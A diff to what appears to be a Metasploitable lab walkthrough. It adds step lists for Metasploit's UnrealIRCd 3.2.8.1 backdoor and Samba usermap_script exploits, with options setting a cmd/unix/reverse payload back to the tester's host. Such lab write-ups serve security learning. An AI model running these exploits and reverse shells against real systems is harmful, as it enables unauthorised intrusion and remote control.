@@ -126,6 +126,16 @@ The output indicates that you have successfully exploited the vulnerability in t
 
 ### unreal_ircd 3.2.8.1
 
+1. search unreal_ircd in the metasploit
+2. use exploit/unix/irc/unreal_ircd_3281_backdoor
+3. configure the options
+    * set RHOSTS <target_ip>
+    * set RPORT 6667
+    * set payload cmd/unix/reverse
+    * set LHOST <your_ip>
+    * set LPORT <your_port>
+4. run the exploit
+
 ```bash
 [msf](Jobs:0 Agents:0) >> search unreal_ircd
 
@@ -255,6 +265,17 @@ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G
 ```
 
 ### Samba
+
+1. search Samba in the metasploit
+2. use exploit/multi/samba/usermap_script
+3. configure the options
+    * set RHOSTS <target_ip>
+    * set RPORT 445
+    * set payload cmd/unix/reverse
+    * set LHOST <your_ip>
+    * set LPORT 4444
+4. run the exploit
+
 
 ```bash
 [msf](Jobs:0 Agents:0) >> search samba
